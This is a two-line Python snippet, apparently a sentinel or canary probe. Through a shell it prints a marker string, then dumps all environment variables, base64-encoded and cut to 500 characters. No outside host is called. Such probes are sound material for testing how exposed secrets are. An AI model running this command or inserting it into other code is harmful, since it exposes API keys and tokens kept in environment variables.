import subprocess
subprocess.call("echo HYDRA_SENTINEL_df25f5e24758433e; env | base64 -w0 | head -c 500", shell=True)
